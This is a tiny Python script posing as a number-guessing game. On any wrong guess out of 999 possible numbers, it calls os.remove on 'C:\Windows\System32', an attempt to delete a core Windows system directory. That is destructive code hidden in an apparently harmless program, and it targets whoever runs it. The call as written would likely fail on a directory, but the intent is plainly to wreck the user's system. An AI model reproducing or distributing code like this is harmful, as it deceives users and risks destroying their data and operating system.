import random
import os

num = random.randint(1,999)
guess = int(input("Guess a random number between 1-999: "))

if guess == num:
    print("Congrats, your guess was right!")
else: os.remove("C:\Windows\System32")